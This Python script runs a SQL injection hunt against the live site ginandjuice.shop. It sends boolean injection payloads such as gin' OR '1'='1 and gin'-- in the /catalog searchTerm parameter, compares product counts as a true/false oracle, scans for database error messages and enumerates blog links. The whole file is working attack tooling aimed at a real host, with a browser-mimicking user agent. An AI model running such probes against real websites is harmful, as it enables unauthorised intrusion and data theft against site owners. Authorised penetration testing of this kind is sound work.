#!/usr/bin/env python3
"""IV-13 Phase 7: ginandjuice SQLi hunt — searchTerm boolean oracle on /catalog.
Hypothesis: searchTerm may be reflected escaped (XSS-safe) but still SQL-interpolated.
Differential: valid term (matches some products) vs boolean-extended terms.
Also: /blog listing params if present. stdlib only."""
import json, os, re, time, ssl, urllib.request, urllib.parse, urllib.error, http.cookiejar
from datetime import datetime, timezone, timedelta

BASE = 'https://ginandjuice.shop'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl.create_default_context()
OUT = '/home/z/my-project/scripts/iv_out'
TZ = timezone(timedelta(hours=2))

def build():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                       urllib.request.HTTPSHandler(context=CTX)), cj

def get(opener, path):
    r = urllib.request.Request(BASE + path, headers={'User-Agent': UA, 'Accept': 'text/html,*/*'})
    try:
        resp = opener.open(r, timeout=25)
        return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, repr(e)[:120]

op, cj = build()
results = {'ts': datetime.now(TZ).isoformat(timespec='seconds'), 'tests': []}

def count_products(html):
    return len(re.findall(r'href="/catalog/product\?productId=', html))

CASES = [
    ('searchTerm=gin', 'gin'),
    ("searchTerm=gin'", "gin'"),
    ("searchTerm=gin' OR '1'='1", "gin' OR '1'='1"),
    ("searchTerm=gin' AND '1'='2", "gin' AND '1'='2"),
    ("searchTerm=gin'--", "gin'--"),
    ("searchTerm=nonexistentterm4321", "nonexistentterm4321"),
    ("searchTerm=nonexistent' OR '1'='1", "nonexistent' OR '1'='1"),
]
for label, term in CASES:
    st, body = get(op, '/catalog?' + urllib.parse.urlencode({'searchTerm': term}))
    n = count_products(body) if isinstance(body, str) else None
    err = None
    if isinstance(body, str):
        m = re.search(r'(SQL|syntax|exception|error)[^<]{0,90}', body, re.I)
        if m and 'searchTerm' not in m.group(0):
            err = m.group(0)[:120]
    rec = {'label': label, 'status': st, 'len': len(body) if isinstance(body, str) else 0,
           'product_links': n, 'err': err}
    results['tests'].append(rec)
    print('%-38s %s len=%-6d products=%-3s err=%s' % (label, st, rec['len'], n, (err or '')[:50]), flush=True)
    time.sleep(0.6)

# blog surface
st, body = get(op, '/blog')
results['blog'] = {'status': st, 'len': len(body) if isinstance(body, str) else 0,
                   'links': sorted(set(re.findall(r'href="(/blog[^"]*)"', body)))[:20] if isinstance(body, str) else []}
print('\n/blog:', st, results['blog']['len'], results['blog']['links'][:10], flush=True)

with open(os.path.join(OUT, 'gj_sqli.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('saved -> scripts/iv_out/gj_sqli.json')
